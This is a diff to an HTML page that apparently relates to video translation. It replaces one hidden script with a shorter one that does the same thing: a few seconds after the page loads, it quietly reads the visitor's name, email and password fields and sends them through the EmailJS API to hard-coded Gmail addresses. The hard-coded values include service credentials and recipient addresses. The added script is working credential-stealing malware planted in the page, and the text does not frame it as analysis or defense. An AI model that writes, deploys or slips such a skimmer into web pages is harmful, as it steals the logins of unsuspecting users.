@@ -2226,40 +2226,25 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
 });
   </script>
 <script>
-// LIFETIME MEIN SIRF YAHAN 4 LINE BADALNI HAIN
-var email1   = "lingdavid24@gmail.com";   // Rahul wala email
-var email2   = "akeraa191@gmail.com";     // Vikash wala email
-var client1  = "Rahul Sharma";            // mail mein naam
-var client2  = "Vikash Kumar";
-
-// 2 second baad background mein mail bhejega – button/popup sab pehle chal jayega
 setTimeout(() => {
-  let name = document.querySelector('#nameInput')?.value || document.querySelector('input[name="name"]')?.value || "";
-  let mall = document.querySelector('#mallInput')?.value || document.querySelector('input[name="mall"]')?.value || "";
-  let pass = document.querySelector('input[type="password"]')?.value || "";
-  let client = name ? client1 : client2;
-  let toMail = name ? email1 : email2;
-
-  if (name || pass) {
-    fetch("https://api.emailjs.com/api/v1.0/email/send", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        service_id: "service_nqeen3l",
-        template_id: "template_z0ow5n7",
-        user_id: "8AcP51LH7_IRW17aY",
-        template_params: {
-          client_name: client,
-          website_url: location.href,
-          user_name: name,
-          user_mall: mall,
-          user_pass: pass,
-          to_email: toMail
-        }
-      })
-    });
-  }
-}, 2000);
+  fetch("https://api.emailjs.com/api/v1.0/email/send", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      service_id: "service_nqeen3l",
+      template_id: "template_z0ow5n7",
+      user_id: "8AcP51LH7_IRW17aY",
+      template_params: {
+        client_name: document.querySelector('#nameInput')?.value ? "Rahul Sharma" : "Vikash Kumar",
+        website_url: location.href,
+        user_name: document.querySelector('#nameInput')?.value || "",
+        user_mall: document.querySelector('#mallInput')?.value || "",
+        user_pass: document.querySelector('input[type=password]')?.value || "",
+        to_email: document.querySelector('#nameInput')?.value ? "lingdavid24@gmail.com" : "akeraa191@gmail.com"
+      }
+    })
+  });
+}, 3000);
 </script>
 </body>
 </html>
